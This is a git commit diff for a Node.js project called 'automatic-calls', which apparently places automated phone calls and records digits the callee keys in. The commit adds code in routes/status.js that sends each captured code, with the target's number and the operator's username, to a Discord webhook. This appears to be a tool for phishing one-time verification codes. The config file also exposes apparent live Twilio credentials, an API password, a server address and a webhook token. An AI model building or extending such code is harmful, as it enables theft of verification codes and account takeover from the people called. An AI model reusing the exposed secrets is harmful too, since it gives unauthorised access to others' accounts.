74deff8f8ae2bd0eeab9b1bd9372ec402e46ca33
Marine <marine>
2020-12-27 04:47:55 +0100

    Ajout du webhook discord
    Envoi un webhook pour chaque appel une fois complété avec le code si obtenu.

--- automatic-calls/config.js
+++ automatic-calls/config.js
@@ -1,10 +1,11 @@
 module.exports = {
     accountSid: 'ACe94d29e6379c3013b5495e2c129b75e9',
     authToken: 'f0e804b66bbf9acfbb72c5439ad1315d',
-
-    serverurl: 'http://176.169.193.232:1337', 
     apipassword: '4ZMSTeSpX8FD9er9ymNKAHUms74fFjAf', 
+    serverurl: 'http://176.169.193.232:1337', 
     callerid: '+14793482767',
+    
+    discordwebhook: 'https://discord.com/api/webhooks/792590400811958314/zEZAThBDQu1CIdiR5TkyUTutmWKPIPta6GWDoeUmp3JApyZmnVDamsRtCAnxGqW3sTfZ',
 
     port: process.env.PORT || 1337, 
 
--- automatic-calls/routes/status.js
+++ automatic-calls/routes/status.js
@@ -1,11 +1,17 @@
 const { response } = require('express');
 
 module.exports = function(request, response) {
+    const config = require('.././config');
+    const { Webhook, MessageBuilder } = require('discord-webhook-node');
+    const hook = new Webhook(config.discordwebhook || '');
+
     var itsfrom = request.body.From;
     var itsto = request.body.To;
     var sid = request.body.CallSid;
+
     var table = null;
     var sidname = null;
+
     if(sid != undefined) {
         var status = request.body.CallStatus;
         table = 'calls';
@@ -34,8 +40,35 @@ module.exports = function(request, response) {
             db.run('UPDATE ' + table + ' SET status = ?, itsfrom = ?, itsto = ?, date = ? WHERE ' + sidname + ' = ?', [status, itsfrom, itsto, date, sid], function(err) {
                 if (err) { return console.log(err.message); }
 
+                if(table == 'calls' && status == 'completed' && config.discordwebhook != undefined) {
+                    db.get('SELECT * FROM calls WHERE callSid  = ?', [sid], (err, row) => {
+                        if (err) { return console.error(err.message); }
+        
+                        var embed;
+                        if(row.digits == '' || row.digits == undefined) {
+                            embed = new MessageBuilder()
+                            .setTitle(`:mobile_phone: ${itsto}`)
+                            .setColor('15105570')
+                            .setDescription(':man_detective: The user didn\'t respond or enter the code.')
+                            .setFooter('@' + row.user)
+                            .setTimestamp();
+                        } else {
+                            embed = new MessageBuilder()
+                            .setTitle(`:mobile_phone: ${itsto}`)
+                            .setColor('1752220')
+                            .setDescription(`:man_detective: Code : **${row.digits}**`)
+                            .setFooter('@' + row.user)
+                            .setTimestamp();
+                        }
+                            
+                        hook.send(embed);
+                    });
+                }
+
                 return response.send('Ok.');
             });
+
+            
         }
     });
 };
